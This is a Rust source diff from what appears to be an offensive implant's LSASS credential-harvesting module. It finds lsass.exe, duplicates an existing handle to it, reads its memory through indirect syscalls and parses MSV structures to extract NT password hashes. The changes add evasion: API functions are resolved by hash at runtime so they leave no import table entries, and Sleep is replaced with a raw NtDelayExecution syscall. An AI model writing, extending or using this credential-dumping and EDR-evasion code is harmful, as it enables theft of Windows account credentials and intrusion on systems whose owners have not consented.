@@ -29,6 +29,8 @@ use serde::Serialize;
 use std::ptr;
 use winapi::um::winnt::{HANDLE, PROCESS_VM_READ, PROCESS_QUERY_INFORMATION};
 
+use crate::nt_handle::NtHandle;
+
 // ── TEB-based PID (no IAT entry) ───────────────────────────────────────────
 
 /// Return the current process ID by reading the TEB directly.
@@ -588,12 +590,12 @@ unsafe fn read_remote_unicode_string(
         return String::new();
     }
 
-    let mut buf = vec![0u8; length];
-    if nt_read_virtual_memory(process, buffer_ptr, &mut buf).is_err() {
+    let mut buf = common::SecureBuffer::new(length);
+    if nt_read_virtual_memory(process, buffer_ptr, buf.as_mut_slice()).is_err() {
         return String::new();
     }
 
-    let utf16: Vec<u16> = buf.chunks(2)
+    let utf16: Vec<u16> = buf.as_slice().chunks(2)
         .map(|c| u16::from_le_bytes([c[0], c.get(1).copied().unwrap_or(0)]))
         .collect();
     String::from_utf16_lossy(&utf16)
@@ -632,12 +634,11 @@ pub struct HarvestResult {
 
 /// Overwrite a byte slice with zeros.  Uses a volatile write to prevent the
 /// compiler from optimizing away the zeroing.
+///
+/// Delegates to `common::secure_zero` — single canonical implementation
+/// shared across crates (lsass_harvest, browser_data, etc.).
 fn secure_zero(slice: &mut [u8]) {
-    for byte in slice.iter_mut() {
-        unsafe { std::ptr::write_volatile(byte, 0) };
-    }
-    // Memory barrier to ensure the volatile writes are not reordered.
-    std::sync::atomic::compiler_fence(std::sync::atomic::Ordering::SeqCst);
+    common::secure_zero(slice);
 }
 
 // ── Privilege preparation ──────────────────────────────────────────────────
@@ -769,7 +770,7 @@ fn enable_debug_privilege() -> Result<bool> {
         }
     }
     let was_enabled = if return_length > 0 {
-        let mut buf = vec![0u8; return_length as usize];
+        let mut buf = common::SecureBuffer::new(return_length as usize);
         let target2 = crate::syscalls::get_syscall_id("NtQueryInformationToken")
             .map_err(|e| anyhow!("NtQueryInformationToken SSN resolution: {e}"))?;
         let status = unsafe {
@@ -952,7 +953,7 @@ fn find_lsass_pid() -> Result<u32> {
         0x4_0000 // 256 KiB default
     };
 
-    let mut buffer = vec![0u8; buf_size];
+    let mut buffer = common::SecureBuffer::new(buf_size);
 
     let status = unsafe {
         nt_query_system_information(
@@ -998,7 +999,6 @@ fn find_lsass_pid() -> Result<u32> {
 
                 if name_hash == LSASS_HASH {
                     let pid = entry.unique_process_id as u32;
-                    secure_zero(&mut buffer);
                     return Ok(pid);
                 }
             }
@@ -1011,7 +1011,6 @@ fn find_lsass_pid() -> Result<u32> {
         offset += next;
     }
 
-    secure_zero(&mut buffer);
     Err(anyhow!("lsass.exe not found in process list"))
 }
 
@@ -1086,7 +1085,7 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
         0x100_000 // 1 MiB
     };
 
-    let mut buffer = vec![0u8; buf_size];
+    let mut buffer = common::SecureBuffer::new(buf_size);
     let status = unsafe {
         nt_query_system_information(
             SYSTEM_HANDLE_INFORMATION,
@@ -1108,7 +1107,6 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
     let entries_start = std::mem::size_of::<SystemHandleInformation>();
 
     if entries_start + count * entry_size > buffer.len() {
-        secure_zero(&mut buffer);
         return Err(anyhow!("handle information buffer truncated"));
     }
 
@@ -1149,7 +1147,7 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
             nt_duplicate_object(
                 source,
                 entry.handle_value as HANDLE,
-                winapi::um::processthreadsapi::GetCurrentProcess(),
+                (-1isize) as winapi::um::winnt::HANDLE, // GetCurrentProcess pseudo-handle
                 LSASS_ACCESS_MASK,
                 DUPLICATE_SAME_ACCESS,
             )
@@ -1161,11 +1159,18 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
             Ok(dup_handle) => {
                 // Verify this handle points to LSASS by querying its PID.
                 let mut pid: u32 = 0;
-                let ok = unsafe {
-                    winapi::um::processthreadsapi::GetProcessId(dup_handle)
+                // Resolve GetProcessId at runtime to avoid IAT entry.
+                let get_pid: Option<unsafe extern "system" fn(winapi::um::winnt::HANDLE) -> u32> =
+                    (|| unsafe {
+                        let k32 = pe_resolve::get_module_handle_by_hash(pe_resolve::HASH_KERNEL32_DLL)?;
+                        let addr = pe_resolve::get_proc_address_by_hash(k32, pe_resolve::hash_str(b"GetProcessId\0"))?;
+                        Some(std::mem::transmute(addr))
+                    })();
+                let ok = match get_pid {
+                    Some(f) => unsafe { f(dup_handle) },
+                    None => continue,
                 };
                 if ok == lsass_pid {
-                    secure_zero(&mut buffer);
                     log::debug!(
                         "lsass_harvest: duplicated LSASS handle from PID {owner_pid}"
                     );
@@ -1177,7 +1182,6 @@ fn duplicate_existing_lsass_handle(lsass_pid: u32) -> Result<HANDLE> {
         }
     }
 
-    secure_zero(&mut buffer);
     Err(anyhow!("no existing LSASS handle found for duplication"))
 }
 
@@ -1269,9 +1273,9 @@ fn parse_msv_credentials(
 
                 if primary_ptr != 0 {
                     // Read the primary credential from LSASS.
-                    let mut primary_buf = vec![0u8; 0x100];
+                    let mut primary_buf = common::SecureBuffer::new(0x100);
                     if let Ok(bytes_read) =
-                        unsafe { nt_read_virtual_memory(process, primary_ptr, &mut primary_buf) }
+                        unsafe { nt_read_virtual_memory(process, primary_ptr, primary_buf.as_mut_slice()) }
                     {
                         if bytes_read >= offsets.nt_hash_offset + 16 {
                             // Extract NT hash (16 bytes).
@@ -1336,7 +1340,6 @@ fn parse_msv_credentials(
                             }
                         }
                     }
-                    secure_zero(&mut primary_buf);
                 }
             }
             pos += 4; // skip past signature
@@ -1608,13 +1611,12 @@ pub fn harvest_lsass() -> Result<String> {
         .context("failed to acquire LSASS handle")?;
 
     // Ensure handle is closed on all exit paths.
-    struct HandleGuard(HANDLE);
-    impl Drop for HandleGuard {
-        fn drop(&mut self) {
-            nt_close(self.0);
-        }
-    }
-    let _guard = HandleGuard(lsass_handle);
+    // P3-17: NtHandle RAII wrapper from nt_handle.rs calls NtClose via
+    // indirect syscall on Drop.  This guarantees the LSASS process handle
+    // is closed even if an error occurs during credential harvesting.  The
+    // handle is obtained with the minimal LSASS_ACCESS_MASK (PROCESS_VM_READ
+    // | PROCESS_QUERY_INFORMATION), not PROCESS_ALL_ACCESS.
+    let _guard = NtHandle::new(lsass_handle as usize);
 
     // 4. Detect Windows build.
     let build = get_windows_build();
@@ -1638,25 +1640,25 @@ pub fn harvest_lsass() -> Result<String> {
         let mut offset = 0usize;
         while offset < region.size {
             let read_size = CHUNK_SIZE.min(region.size - offset);
-            let mut chunk = vec![0u8; read_size];
+            let mut chunk = common::SecureBuffer::new(read_size);
 
             match unsafe {
-                nt_read_virtual_memory(lsass_handle, region.base + offset, &mut chunk)
+                nt_read_virtual_memory(lsass_handle, region.base + offset, chunk.as_mut_slice())
             } {
                 Ok(bytes_read) if bytes_read > 0 => {
                     // Truncate to actual bytes read.
                     chunk.truncate(bytes_read);
-                    let mut writable = chunk.into_boxed_slice();
 
                     parse_chunk(
-                        &mut writable,
+                        chunk.as_mut_slice(),
                         region.base + offset,
                         lsass_handle,
                         msv_offsets,
                         wdigest_offsets,
                         &mut credentials,
                     );
-                    // writable is dropped here, already zeroed by parse_chunk.
+                    // chunk dropped here, zeroized by SecureBuffer Drop
+                    // (parse_chunk also zeroizes as defense-in-depth).
                 }
                 _ => {
                     // Read failed or returned 0 bytes — skip this chunk.
@@ -1666,9 +1668,16 @@ pub fn harvest_lsass() -> Result<String> {
             offset += read_size;
         }
 
-        // Sleep between regions to mimic normal memory access patterns.
+        // Sleep between regions via NtDelayExecution (no IAT entry).
         unsafe {
-            winapi::um::synchapi::Sleep(INTER_REGION_SLEEP_MS);
+            let delay = std::time::Duration::from_millis(INTER_REGION_SLEEP_MS as u64);
+            let mut li = -(delay.as_nanos() as i64) / 100; // negative = relative, in 100ns units
+            let li_bytes = std::mem::transmute::<i64, [u8; 8]>(li);
+            let _ = crate::syscalls::syscall!(
+                "NtDelayExecution",
+                0u64,           // Alertable = FALSE
+                li_bytes.as_ptr() as u64,
+            );
         }
     }
 
